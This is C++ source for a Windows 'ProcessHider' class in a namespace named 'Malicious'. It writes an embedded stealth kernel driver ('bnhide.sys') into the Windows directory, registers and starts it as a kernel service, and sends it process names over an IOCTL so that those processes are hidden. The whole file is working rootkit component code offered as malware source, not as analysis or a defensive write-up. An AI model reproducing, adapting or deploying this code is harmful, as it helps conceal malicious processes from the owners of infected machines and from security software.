//!
//!     Kaleidoscalp, all rights reserved.
//!

#include "ProcessHider.hpp"
#include "StealthDriver.hpp"
#include "BinaryRessource.hpp"
#include <system/System.hpp>
#include <common/Convert.hpp>
#include <common/Logger.hpp>

#ifdef  _WIN32_IE
#undef _WIN32_IE
#endif
#define _WIN32_IE 0x0501

#define SYS_DRIVER_FILENAME "bnhide.sys"
#define IOCTL_NAME_PRCSS CTL_CODE(40000, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
enum {MAXLEN_NAME=30};
char sznamesys[] = "bnhide";

namespace Malicious
{
    typedef struct _DATA_SURVEY
    {
        unsigned long len;
        wchar_t name[MAXLEN_NAME];
    } DATA_SURVEY, *PDATA_SURVEY;
    
    ProcessHider::DriverError::DriverError()
    {
        SHOW_LAST_ERROR();
    }

    ProcessHider::ProcessHider()
    {
		std::string windownPath;
		System::getWindowsPath(windownPath);
        driverPath = windownPath + "\\" + SYS_DRIVER_FILENAME;
        
        BinaryRessource driver(StealthDriver, sizeof(StealthDriver), driverPath, true);
        
        openServiceManager();
        startService();
        closeService();
        closeServiceManager();
    }

    ProcessHider::~ProcessHider()
    {
        closeService();
        closeServiceManager();
    }

    void ProcessHider::hide(const std::string& processName)
    {
        HANDLE hdev = CreateFile("\\\\.\\bnhide", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
        if(hdev == INVALID_HANDLE_VALUE)
        {
            LOG << "Impossible de creer le fichier peripherique pour le driver.";
            throw DriverError();
        }

        DATA_SURVEY dts;
        char szname[MAXLEN_NAME + 4];
        strncpy(szname, processName.c_str(), MAXLEN_NAME);
        dts.len = processName.size();

        if(dts.len)
        {
            WCHAR name[MAXLEN_NAME + 1];
            MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, szname, -1, name, MAXLEN_NAME + 1);
            memcpy(dts.name, name, dts.len * 2);
        }

        DWORD d = 0;
        BOOL b = DeviceIoControl(hdev, (DWORD) IOCTL_NAME_PRCSS, &dts, sizeof(DATA_SURVEY), 0, 0, &d, 0);
        CloseHandle(hdev);

        if(!b)
        {
            d = GetLastError();
            if(d)
            {
                LOG << to_string(d);
            }
            else
            {
                LOG << "Impossible de commander le driver.";
                throw DriverError();
            }
        }
    }

    void ProcessHider::remove()
    {
        openServiceManager();
        openService();
        stopService();
        closeService();
        closeServiceManager();
    }

    void ProcessHider::openServiceManager()
    {
        manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if(!manager)
        {
            LOG << "Impossible d'ouvrir le service manager.";
            throw DriverError();
        }
    }
    
    void ProcessHider::closeServiceManager()
    {
        CloseServiceHandle(manager);
    }

    void ProcessHider::openService()
    {
        service = OpenService(manager, sznamesys, SERVICE_ALL_ACCESS);
        if(!service)
        {
            LOG << "Impossible d'ouvrir le service.";
            throw DriverError();
        }
    }
    void ProcessHider::closeService()
    {
        CloseServiceHandle(service);
    }
    void ProcessHider::startService()
    {
        service = CreateService(manager, sznamesys, sznamesys,
                                SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                                SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, driverPath.c_str(),
                                NULL, NULL, NULL, NULL, NULL);
        if(!service)
        {
            closeServiceManager();
            if(GetLastError() == ERROR_SERVICE_EXISTS)
            {
                LOG << "Le service existe deja.";
                return;
            }
            else 
            {
                LOG << "Impossible de creer le service.";
                throw DriverError();
            }
        }
        if(!StartService(service, 0, 0))
        {
            LOG << "Impossible de demarrer le serice.";
            throw DriverError();
        }
    }
    void ProcessHider::stopService()
    {
        SERVICE_STATUS status;
        ControlService(service, SERVICE_CONTROL_STOP, &status);
        if(!DeleteService(service)) 
        {
            LOG << "Impossible de stopper le service.";
            throw DriverError();
        }
    }
} // Malicious


